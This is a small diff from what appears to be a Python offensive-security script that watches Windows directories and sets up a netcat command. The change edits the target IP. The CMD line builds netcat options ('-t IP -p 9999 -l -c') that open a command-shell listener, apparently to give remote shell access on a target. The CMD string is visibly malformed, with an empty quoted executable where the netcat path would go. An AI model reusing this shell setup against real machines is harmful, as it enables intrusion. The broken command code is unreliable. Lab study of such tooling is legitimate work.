@@ -14,7 +14,7 @@ FILE_LIST_DIRECTORY = 0x0001
 PATHS = ["c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity", tempfile.gettempdir()]
 
 NETCAT = "c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity\\dist\\netcat.exe"
-TGT_IP = "10.0.1.5"
+TGT_IP = "10.0.0.5"
 CMD = f'"""" -t {TGT_IP} -p 9999 -l -c'
 
 FILE_TYPES = {
